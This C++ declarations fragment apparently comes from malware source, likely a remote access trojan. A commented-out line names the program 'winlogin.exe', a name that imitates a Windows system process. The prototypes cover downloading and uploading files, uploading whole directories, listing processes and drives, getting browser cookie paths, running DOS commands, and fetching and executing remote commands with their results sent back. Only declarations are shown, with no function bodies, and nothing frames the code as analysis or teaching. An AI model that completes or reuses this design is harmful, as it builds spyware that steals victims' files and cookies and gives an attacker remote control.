
//string CURRENT_EXE_NAME, EXE_NAME = "winlogin.exe";
string USERPROFILE_PATH, CURRENT_FILE_PATH, FILE_PATH;

CRITICAL_SECTION sectionBrowse, sectionBrowseAll;

string DownloadFile (const char *, const char * = NULL);
bool UploadFile (string Path);

/* Utility Function */

string convertToString (double);
double roundOff (double);
string convertSize (size_t);
int file_size (const char *);
string getFileSize (string);

vector <string> split (string, char);
string toLowerCase (string);
string strTrim (string);

/* ------------------- */

string GetProcesses ();
string GetDrives ();
string GetDate ();
bool ExecuteURL (string);
bool SendSMS (string);

string UserName ();
string ComputerName ();
string GetUniqueID ();
string GetDate ();

bool BrowseDirectory (ofstream &, string, string, bool = true);
void FindFile (string, string, vector<string> &);
void UploadDir (string);

void DOSCommand (string);
string getCookiePath (string); 
string GetCommand (string);
bool ParseCommand(string, string &, string &, vector<string> &);
DWORD WINAPI ExecuteCommand(LPVOID);
void UploadResult (string, bool);